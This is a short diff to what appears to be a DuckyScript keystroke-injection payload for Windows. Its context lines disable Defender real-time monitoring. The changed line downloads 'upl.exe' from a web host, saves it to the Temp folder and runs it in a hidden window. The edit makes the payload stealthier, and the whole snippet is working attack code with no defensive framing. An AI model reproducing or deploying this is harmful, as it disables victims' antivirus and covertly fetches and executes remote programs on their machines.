@@ -15,5 +15,5 @@ DELAY 500
 STRING Set-MpPreference -DisableRealtimeMonitoring $true
 ENTER
 DELAY 200
-STRING iwr -Uri 'http://example.com/upl.exe' -OutFile 'upl.exe'; Start-Sleep -Seconds 1; Start-Process 'upl.exe'; exit
+STRING iwr -Uri 'http://example.com/upl.exe' -OutFile "$env:Temp\upl.exe"; Start-Sleep -Seconds 1; Start-Process "$env:Temp\upl" -WindowStyle Hidden; exit
 ENTER
